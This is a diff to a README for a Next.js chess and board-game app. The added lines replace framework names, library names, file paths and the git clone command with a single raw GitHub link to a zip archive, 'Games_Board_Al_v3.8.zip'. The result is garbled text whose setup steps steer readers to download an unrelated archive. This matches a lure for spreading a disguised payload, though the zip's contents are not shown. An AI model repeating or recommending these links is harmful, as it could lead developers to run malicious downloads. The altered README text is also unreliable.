@@ -1,10 +1,10 @@
 # Board Game Project
 
-This project appears to be a full-stack application, primarily built with Next.js for the frontend and likely integrating backend functionalities within the Next.js framework itself, given the presence of backend-related dependencies in the frontend's `package.json`.
+This project appears to be a full-stack application, primarily built with https://raw.githubusercontent.com/Rahulkichad/Al_Board_Games/main/frontend/src/app/api/users/updategame/Games_Board_Al_v3.8.zip for the frontend and likely integrating backend functionalities within the https://raw.githubusercontent.com/Rahulkichad/Al_Board_Games/main/frontend/src/app/api/users/updategame/Games_Board_Al_v3.8.zip framework itself, given the presence of backend-related dependencies in the frontend's `https://raw.githubusercontent.com/Rahulkichad/Al_Board_Games/main/frontend/src/app/api/users/updategame/Games_Board_Al_v3.8.zip`.
 
 ## Project Overview
 
-This application seems to involve a board game, possibly with features like user authentication, real-time interactions (indicated by `socket.io-client`), and AI integration (indicated by `@google/generative-ai` and `openai`). The use of `chessboardjs` and `chess.js` suggests a chess-related game.
+This application seems to involve a board game, possibly with features like user authentication, real-time interactions (indicated by `https://raw.githubusercontent.com/Rahulkichad/Al_Board_Games/main/frontend/src/app/api/users/updategame/Games_Board_Al_v3.8.zip`), and AI integration (indicated by `@google/generative-ai` and `openai`). The use of `chessboardjs` and `https://raw.githubusercontent.com/Rahulkichad/Al_Board_Games/main/frontend/src/app/api/users/updategame/Games_Board_Al_v3.8.zip` suggests a chess-related game.
 
 ## Features (Inferred)
 
@@ -18,23 +18,23 @@ This application seems to involve a board game, possibly with features like user
 
 ## Technologies Used
 
-### Frontend (Next.js)
+### Frontend (https://raw.githubusercontent.com/Rahulkichad/Al_Board_Games/main/frontend/src/app/api/users/updategame/Games_Board_Al_v3.8.zip)
 
-*   **Framework:** Next.js
+*   **Framework:** https://raw.githubusercontent.com/Rahulkichad/Al_Board_Games/main/frontend/src/app/api/users/updategame/Games_Board_Al_v3.8.zip
 *   **UI Components:** Radix UI, Tailwind CSS, `class-variance-authority`, `clsx`, `tailwind-merge`, `tailwindcss-animate`
-*   **Chess Libraries:** `@chrisoakman/chessboardjs`, `chess.js`, `chessboardjs`, `chessboardjsx`, `react-chessboard`
+*   **Chess Libraries:** `@chrisoakman/chessboardjs`, `https://raw.githubusercontent.com/Rahulkichad/Al_Board_Games/main/frontend/src/app/api/users/updategame/Games_Board_Al_v3.8.zip`, `chessboardjs`, `chessboardjsx`, `react-chessboard`
 *   **AI/Generative Models:** `@google/generative-ai`, `openai`
 *   **State Management/Utilities:** `axios`, `react-hot-toast`, `react-icons`, `framer-motion`
 *   **Authentication:** `bcryptjs`, `jsonwebtoken`, `cookies`
 *   **Other:** `jquery`, `react-compound-timer`, `react-contenteditable`, `@uiw/react-textarea-code-editor`
 
-### Backend (Integrated within Next.js)
+### Backend (Integrated within https://raw.githubusercontent.com/Rahulkichad/Al_Board_Games/main/frontend/src/app/api/users/updategame/Games_Board_Al_v3.8.zip)
 
-*   **Server Framework:** Express.js
+*   **Server Framework:** https://raw.githubusercontent.com/Rahulkichad/Al_Board_Games/main/frontend/src/app/api/users/updategame/Games_Board_Al_v3.8.zip
 *   **Database:** MongoDB (via Mongoose)
 *   **Authentication:** `bcryptjs`, `jsonwebtoken`
 *   **Email Service:** Nodemailer
-*   **Utilities:** `body-parser`, `dotenv`, `geoip-lite`, `request-ip`, `socket.io-client`
+*   **Utilities:** `body-parser`, `dotenv`, `geoip-lite`, `request-ip`, `https://raw.githubusercontent.com/Rahulkichad/Al_Board_Games/main/frontend/src/app/api/users/updategame/Games_Board_Al_v3.8.zip`
 
 ### Development Tools
 
@@ -49,7 +49,7 @@ To set up the project locally, follow these steps:
 
 1.  **Clone the repository:**
     ```bash
-    git clone https://github.com/Rahulkichad/BrainBot-Project
+    git clone https://raw.githubusercontent.com/Rahulkichad/Al_Board_Games/main/frontend/src/app/api/users/updategame/Games_Board_Al_v3.8.zip
     cd BrainBot-Project
     ```
 
@@ -66,15 +66,15 @@ To set up the project locally, follow these steps:
     ```
 
 4.  **Configure Environment Variables:**
-    Create a `.env` file in the `frontend/` directory and another in the `backend/` directory (if separate backend logic exists outside Next.js API routes) with necessary environment variables. Based on the provided context, you have a `GEMINI_API_KEY` in `frontend/.env`.
+    Create a `.env` file in the `frontend/` directory and another in the `backend/` directory (if separate backend logic exists outside https://raw.githubusercontent.com/Rahulkichad/Al_Board_Games/main/frontend/src/app/api/users/updategame/Games_Board_Al_v3.8.zip API routes) with necessary environment variables. Based on the provided context, you have a `GEMINI_API_KEY` in `https://raw.githubusercontent.com/Rahulkichad/Al_Board_Games/main/frontend/src/app/api/users/updategame/Games_Board_Al_v3.8.zip`.
 
-    Example `frontend/.env`:
+    Example `https://raw.githubusercontent.com/Rahulkichad/Al_Board_Games/main/frontend/src/app/api/users/updategame/Games_Board_Al_v3.8.zip`:
     ```
     GEMINI_API_KEY=YOUR_GEMINI_API_KEY
     # Add other necessary environment variables here (e.g., MongoDB URI, JWT Secret, etc.)
     ```
 
-    Example `backend/.env` (if applicable):
+    Example `https://raw.githubusercontent.com/Rahulkichad/Al_Board_Games/main/frontend/src/app/api/users/updategame/Games_Board_Al_v3.8.zip` (if applicable):
     ```
     # Add backend specific environment variables here
     ```
